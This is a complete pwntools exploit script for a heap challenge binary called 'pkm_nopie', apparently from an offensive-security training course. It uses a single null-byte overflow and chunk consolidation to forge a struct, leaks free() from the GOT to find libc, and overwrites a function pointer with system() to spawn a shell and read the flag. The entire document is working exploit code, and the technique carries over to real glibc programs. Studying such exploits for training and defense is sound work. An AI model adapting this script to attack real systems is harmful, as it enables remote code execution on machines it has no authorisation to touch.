from pwn import *
import sys
import time
import re

context.arch = 'amd64'

if(len(sys.argv) > 1):
    if(sys.argv[1] == '--debug'):
        p = process("./pkm_nopie")
        gdb.attach(p, """
        set disable-randomization on
        """ )
        input("wait...")
    elif(sys.argv[1] == '--strace'):
        p = process(["strace", "./pkm_nopie"])
    elif(sys.argv[1] == '--remote'):
        p = remote("bin.training.offdef.it", 2025)
else:
    p = process("./pkm_nopie")

libc = ELF("./libc-2.27_notcache.so")

def add_pkm():
    p.recvuntil(b"> ")
    p.sendline(b"0")

def rename_pkm(pkm_index, length, new_name):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    p.recvuntil(b"> ")
    p.sendline(b"%d" % pkm_index)
    p.recvuntil(b"[.] insert length: ")
    p.sendline(b"%d" % length)
    time.sleep(0.1)
    p.send(new_name)

def rename(pkm_index, new_name):
    rename_pkm(pkm_index, len(new_name), new_name)


def delete_pkm(pkm_index):
    p.recvuntil(b"> ")
    p.sendline(b"2")
    p.recvuntil(b"> ")
    p.sendline(b"%d" % pkm_index)

def fight_pkm(pkm_first, move, pkm_second):
    p.recvuntil(b"> ")
    p.sendline(b"3")
    p.recvuntil(b"> ")
    p.sendline(b"%d" % pkm_first)
    p.recvuntil(b"> ")
    p.sendline(b"%d" % move)
    p.recvuntil(b"> ")
    p.sendline(b"%d" % pkm_second)

def info_pkm(pkm_index):
    p.recvuntil(b"> ")
    p.sendline(b"4")
    p.recvuntil(b"> ")
    p.sendline(b"%d" % pkm_index)
    nameline = p.recvuntil(b" *ATK")[:-len(" *ATK")]
    m = re.match(b" \*Name: (.+)", nameline)
    return m.group(1)

def quit():
    p.recvuntil(b"> ")
    p.sendline(b"5")

def pkm(index, ptr_name, ptr_move = None):
    binsh = int(b"/bin/sh\x00"[::-1].hex(), 16)
    pkm = b""
    pkm += p64(binsh) + p64(420) # atk, def
    pkm += p64(420) + p64(420) # hp, total_hp
    pkm += p64(0xdeadbeef) + p64(ptr_name) # undefined8, name*
    pkm += p64(index) # index
    for _ in range(4):
        pkm += p64(0xdeadbeef) # undefined8

    if(ptr_move is not None):
        pkm += p64(0x0040202f) # move name: "Tackle"
        pkm += p64(ptr_move)

    pkm += b"\x00" * (0xf8 - len(pkm)) # padding
    return pkm

for i in range(3):
    add_pkm()

rename(0, b"A"*0x108) # A
rename(1, b"B"*0x208) # B, fits two pkm
rename(2, b"C"*0x100) # C

delete_pkm(1) # free(B)

add_pkm() # index 1 (A, empty, C)

rename(0, b"A"*0x108) # Single Null Byte Overflow

add_pkm() # B1, index 3

add_pkm() # B2, index 4

delete_pkm(3) # free(B1)
delete_pkm(2) # Free(C) trigger the merge with the previous chunk

rename(1, b"D"*0x100 + pkm(4, 0x00404018))
name = info_pkm(4) + b"\x00"*2
leak_free = u64(name)
libc.address = (leak_free - libc.symbols.free)

print("[!] leak free: %#x" % leak_free)
print("[!] libc: %#x" % libc.address)
print("[!] system: %#x" % libc.symbols.system)

## Second Stage, add a move

for i in range(3):
    add_pkm() # indexes [2, 3, 5]

rename(2, b"A"*0x108) # A
rename(3, b"B"*0x208) # B, fits two pkm
rename(5, b"C"*0x100) # C

delete_pkm(3) # free(B)

add_pkm() # index 3 (A, empty, C)

rename(2, b"A"*0x108) # Single Null Byte Overflow

add_pkm() # B1, index 6

add_pkm() # B2, index 7

delete_pkm(6) # free(B1)
delete_pkm(5) # Free(C) trigger the merge with the previous chunk

rename(3, b"D"*0x100 + pkm(4, 0x00402030, libc.symbols.system))

fight_pkm(7, 0, 0)

p.sendline('cat flag')

p.interactive()